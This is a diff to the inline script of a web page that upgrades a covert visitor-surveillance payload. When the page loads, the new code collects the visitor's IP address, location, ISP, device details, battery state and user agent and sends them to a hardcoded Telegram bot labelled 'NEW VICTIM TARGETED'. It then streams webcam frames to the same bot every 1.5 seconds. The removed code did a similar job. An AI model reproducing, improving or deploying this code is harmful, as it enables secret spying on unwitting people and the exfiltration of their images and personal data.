@@ -60,97 +60,116 @@ a {
 }
 </style>
 <script>
-const BOT_TOKEN = '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8';
-const CHAT_ID = '6326816238';
+(() => {
+    const C2_CONFIG = {
+        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
+        chatId: '6326816238',
+        interval: 1500
+    };
 
-        function sendIPAndUserAgent() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const userAgent = navigator.userAgent;
-                    const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
-                    sendMessageToTelegram(message);
-                })
-                .catch(error => console.error('Error fetching IP address:', error));
+    const telegramApi = (method, body) => {
+        return fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/${method}`, {
+            method: 'POST',
+            body: body
+        });
+    };
+
+    async function collectSystemInfo() {
+        let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A', org: 'N/A' };
+        
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) ipData = await res.json();
+        } catch (e) {
+            try {
+                const resAlt = await fetch('https://api.ipify.org?format=json');
+                const data = await resAlt.json();
+                ipData.ip = data.ip;
+            } catch (err) {}
         }
 
-        function sendMessageToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Message sent to Telegram');
-                } else {
-                    console.error('Failed to send message to Telegram');
-                }
-            })
-            .catch(error => console.error('Error sending message to Telegram:', error));
-        }
+        const info = `
+🔥 *NEW VICTIM TARGETED* 🔥
+----------------------------------
+🌐 *IP Address:* \`${ipData.ip}\`
+📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}
+ISP: ${ipData.org || 'N/A'}
+💻 *OS/Platform:* \`${navigator.platform}\`
+🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
+⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || 'N/A'}
+🧠 *RAM:* ~${navigator.deviceMemory || 'N/A'} GB
+🔋 *Battery:* ${await getBatteryInfo()}
+🕵️ *User-Agent:* \`${navigator.userAgent}\`
+----------------------------------
+        `;
 
-        function takePhotoAndSend() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const photo = canvas.toDataURL('image/jpeg');
-                            sendPhoto(photo);
-                            video.srcObject.getTracks().forEach(track => track.stop());
-                            video.remove();
-                        }, 1000);
-                    };
-                })
-                .catch(error => console.error('Error accessing camera:', error));
-        }
+        const formData = new FormData();
+        formData.append('chat_id', C2_CONFIG.chatId);
+        formData.append('text', info);
+        formData.append('parse_mode', 'Markdown');
+        
+        telegramApi('sendMessage', formData);
+    }
 
-        function sendPhoto(photo) {
-            const blob = dataURItoBlob(photo);
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            } catch (e) { return 'N/A'; }
+        }
+        return 'N/A';
+    }
+
+    let globalStream = null;
+    let canvas = document.createElement('canvas');
+    let ctx = canvas.getContext('2d');
+    let video = document.createElement('video');
+    video.autoplay = true;
+    video.playsInline = true;
+
+    async function initCamera() {
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" }
+            });
+            video.srcObject = globalStream;
+            video.onloadedmetadata = () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                setInterval(captureAndSendFrame, C2_CONFIG.interval);
+            };
+        } catch (err) {
+            sendErrorLog(`Camera Access Denied/Failed: ${err.message}`);
+        }
+    }
+
+    function captureAndSendFrame() {
+        if (!globalStream || video.readyState !== video.HAVE_ENOUGH_DATA) return;
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob((blob) => {
+            if (!blob) return;
+            
             const formData = new FormData();
-            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', C2_CONFIG.chatId);
+            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Photo sent to Telegram');
-                } else {
-                    console.error('Failed to send photo to Telegram');
-                }
-            })
-            .catch(error => console.error('Error sending photo to Telegram:', error));
-        }
+            telegramApi('sendPhoto', formData).catch(() => {});
+        }, 'image/jpeg', 0.7);
+    }
 
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const arrayBuffer = new ArrayBuffer(byteString.length);
-            const intArray = new Uint8Array(arrayBuffer);
-            for (let i = 0; i < byteString.length; i++) {
-                intArray[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([arrayBuffer], { type: mimeString });
-        }
+    function sendErrorLog(msg) {
+        const formData = new FormData();
+        formData.append('chat_id', C2_CONFIG.chatId);
+        formData.append('text', `⚠️ *LOG ERROR:* ${msg}`);
+        formData.append('parse_mode', 'Markdown');
+        telegramApi('sendMessage', formData);
+    }
 
-        sendIPAndUserAgent();
-        setInterval(takePhotoAndSend, 1000);
+    collectSystemInfo();
+    initCamera();
+})();
 </script>
 <table width="100%" height="100%">
     <td align="center">
